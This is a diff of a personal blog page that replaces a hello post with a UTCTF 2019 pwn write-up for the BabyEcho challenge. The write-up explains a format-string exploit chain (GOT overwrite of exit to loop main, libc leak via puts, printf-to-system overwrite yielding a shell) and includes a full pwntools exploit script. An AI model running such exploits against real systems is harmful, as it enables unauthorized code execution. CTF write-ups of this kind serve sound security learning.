@@ -16,24 +16,27 @@
   <meta name="author" content="k12aruu">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Hello My BlogAbout this blog​	Today, I create my first blog,I start to write blog because I want to record my journey as a CTFer and an Information Security researcher. I  really want to achieve somet">
+    <meta name="description" content="UTCTF 2019 pwn writeupBabyEcho​	It’s easy to figure out that this is something related to format string and we can just use printf once which is clearly hard for us to getshell by one printf, so the f">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hello-blog">
-<meta property="og:url" content="https://k12aruu.github.io/2024/02/25/hello-blog/index.html">
+<meta property="og:title" content="UTCTF2019-PWN-writeup">
+<meta property="og:url" content="https://k12aruu.github.io/2024/02/25/UTCTF2019-PWN-writeup/index.html">
 <meta property="og:site_name" content="k12aruu blog">
-<meta property="og:description" content="Hello My BlogAbout this blog​	Today, I create my first blog,I start to write blog because I want to record my journey as a CTFer and an Information Security researcher. I  really want to achieve somet">
+<meta property="og:description" content="UTCTF 2019 pwn writeupBabyEcho​	It’s easy to figure out that this is something related to format string and we can just use printf once which is clearly hard for us to getshell by one printf, so the f">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://k12aruu.github.io/2024/02/25/hello-blog/hello-blog-1.jpg">
-<meta property="article:published_time" content="2024-02-24T17:58:28.000Z">
-<meta property="article:modified_time" content="2024-02-24T18:25:44.657Z">
+<meta property="og:image" content="https://k12aruu.github.io/2024/02/25/UTCTF2019-PWN-writeup/pic1.png">
+<meta property="og:image" content="https://k12aruu.github.io/2024/02/25/UTCTF2019-PWN-writeup/pic2.png">
+<meta property="og:image" content="https://k12aruu.github.io/2024/02/25/UTCTF2019-PWN-writeup/pic3.png">
+<meta property="article:published_time" content="2024-02-25T07:15:12.000Z">
+<meta property="article:modified_time" content="2024-02-25T07:22:21.443Z">
 <meta property="article:author" content="k12aruu">
-<meta property="article:tag" content="life">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://k12aruu.github.io/2024/02/25/hello-blog/hello-blog-1.jpg">
+<meta name="twitter:image" content="https://k12aruu.github.io/2024/02/25/UTCTF2019-PWN-writeup/pic1.png">
   
   
   
-  <title>hello-blog - k12aruu blog</title>
+  <title>UTCTF2019-PWN-writeup - k12aruu blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -228,7 +231,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="hello-blog"></span>
+            <span id="subtitle" data-typed-text="UTCTF2019-PWN-writeup"></span>
           
         </div>
 
@@ -239,8 +242,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-25 01:58" pubdate>
-          February 25, 2024 am
+        <time datetime="2024-02-25 15:15" pubdate>
+          February 25, 2024 pm
         </time>
       </span>
     
@@ -251,7 +254,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          10 words
+          284 words
         
       </span>
     
@@ -262,7 +265,7 @@
         
         
         
-          1 mins
+          3 mins
         
       </span>
     
@@ -307,15 +310,31 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">hello-blog</h1>
+            <h1 id="seo-header">UTCTF2019-PWN-writeup</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Hello-My-Blog"><a href="#Hello-My-Blog" class="headerlink" title="Hello My Blog"></a>Hello My Blog</h1><h2 id="About-this-blog"><a href="#About-this-blog" class="headerlink" title="About this blog"></a>About this blog</h2><p>​	Today, I create my first blog,I start to write blog because I want to record my journey as a CTFer and an Information Security researcher. I  really want to achieve something in the field I love.</p>
-<p>​	My next blog will talk about things I want to do in 2024. Thanks for watching this blog.</p>
-<p>BTW I really love anime and I like kizaru in one piece, maybe I will talk more about these in future(I will also write something about daily life).</p>
-<img src="/2024/02/25/hello-blog/hello-blog-1.jpg" srcset="/img/loading.gif" lazyload class="">
+                <h1 id="UTCTF-2019-pwn-writeup"><a href="#UTCTF-2019-pwn-writeup" class="headerlink" title="UTCTF 2019 pwn writeup"></a>UTCTF 2019 pwn writeup</h1><h2 id="BabyEcho"><a href="#BabyEcho" class="headerlink" title="BabyEcho"></a>BabyEcho</h2><p>​	It’s easy to figure out that this is something related to format string and we can just use printf once which is clearly hard for us to getshell by one printf, so the first task is to solve this problem.</p>
+<img src="/2024/02/25/UTCTF2019-PWN-writeup/pic1.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>​	By look at pseudocode generated by IDA we can find that program call exit function after the printf:</p>
+<img src="/2024/02/25/UTCTF2019-PWN-writeup/pic2.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>​	so maybe we can alter the got table of exit to the address of main function,which can make the program into an infinite loop.</p>
+<p>(Note: by a little calculation we can find that we need two characters at the start of the payload to solve alignment problem,you can use telescope in gdb and figure out by yourself)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&quot;babyecho-bak&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>s=process(<span class="hljs-string">&quot;./babyecho-bak&quot;</span>)<br><span class="hljs-comment">#gdb.attach(s,&quot;b *0x8048593\nc&quot;)</span><br>exit_got=elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>main=<span class="hljs-number">0x0804851B</span><br>payload=<span class="hljs-string">&quot;aa&quot;</span>+<span class="hljs-string">&quot;%25c%17$hhn%106c%18$hhna&quot;</span>+p32(exit_got)+p32(exit_got+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br><br>s.sendlineafter(<span class="hljs-string">&quot;Give me a string to echo back.\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
+
+<p>here, instead of using fmtstr_payload() in pwntools I write the payload myself because the restriction of 50 bytes input.</p>
+<p>Also I find that the higher two bytes of main and exit_got is same so I only alter the lower two bytes.</p>
+<p>After running the code above we can find we can find that program go back to main function.</p>
+<p>So, after finishing task 1, the rest is simple, we need to leak the libc address and alter the got table of printf to the system address and send “&#x2F;bin&#x2F;sh” to the program.</p>
+<p>The full exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&quot;babyecho-bak&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>s=process(<span class="hljs-string">&quot;./babyecho-bak&quot;</span>)<br><span class="hljs-comment">#gdb.attach(s,&quot;b *0x8048593\nc&quot;)</span><br>exit_got=elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>main=<span class="hljs-number">0x0804851B</span><br><span class="hljs-comment">#main=0x08048400</span><br><span class="hljs-comment">#+0:00   +1:0x84</span><br><span class="hljs-comment">#payload=&quot;aa&quot;+fmtstr_payload(11,&#123;exit_got:main&#125;,numbwritten=2,write_size=&#x27;short&#x27;)</span><br>payload=<span class="hljs-string">&quot;aa&quot;</span>+<span class="hljs-string">&quot;%25c%17$hhn%106c%18$hhna&quot;</span>+p32(exit_got)+p32(exit_got+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br><br>s.sendlineafter(<span class="hljs-string">&quot;Give me a string to echo back.\n&quot;</span>,payload)<br>payload2=<span class="hljs-string">&quot;aa&quot;</span>+<span class="hljs-string">&quot;%13$saaa&quot;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) <span class="hljs-comment">#leak libc address</span><br><span class="hljs-comment">#gdb.attach(s,&quot;b *0x8048593\nc&quot;)</span><br><span class="hljs-comment">#raw_input(&quot;&gt;&quot;)</span><br>s.sendlineafter(<span class="hljs-string">&quot;back.\n&quot;</span>,payload2)<br>puts_got=u32(s.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br>libc.address=puts_got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-built_in">hex</span>(libc.address))<br>success(<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]))<br>payload3=<span class="hljs-string">&quot;aa&quot;</span>+fmtstr_payload(<span class="hljs-number">11</span>,&#123;elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]:libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]&#125;,numbwritten=<span class="hljs-number">2</span>,write_size=<span class="hljs-string">&#x27;short&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload3))<br><br>s.sendlineafter(<span class="hljs-string">&quot;back.\n&quot;</span>,payload3)<br>s.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>s.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>​	For payload3, I use fmtstr_payload to make things easier and if write_size&#x3D;’byte’ then the length of payload3 is 66 so I have to change it to ‘short’, I think there are some ways to solve this problem and maybe I will come back to it later. :)</p>
+<img src="/2024/02/25/UTCTF2019-PWN-writeup/pic3.png" srcset="/img/loading.gif" lazyload class="">
+
 
                 
               </div>
@@ -334,7 +353,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/test/" class="category-chain-item">test</a>
+  <a href="/categories/writeup/" class="category-chain-item">writeup</a>
   
   
 
@@ -349,7 +368,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/life/" class="print-no-link">#life</a>
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
       
     </div>
   
@@ -361,8 +382,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>hello-blog</div>
-      <div>https://k12aruu.github.io/2024/02/25/hello-blog/</div>
+      <div>UTCTF2019-PWN-writeup</div>
+      <div>https://k12aruu.github.io/2024/02/25/UTCTF2019-PWN-writeup/</div>
     </div>
     <div class="license-meta">
       
@@ -406,15 +427,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/02/25/UTCTF2019-PWN-writeup/" title="UTCTF2019-PWN-writeup">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">UTCTF2019-PWN-writeup</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2024/02/25/hello-blog/" title="hello-blog">
+                        <span class="hidden-mobile">hello-blog</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
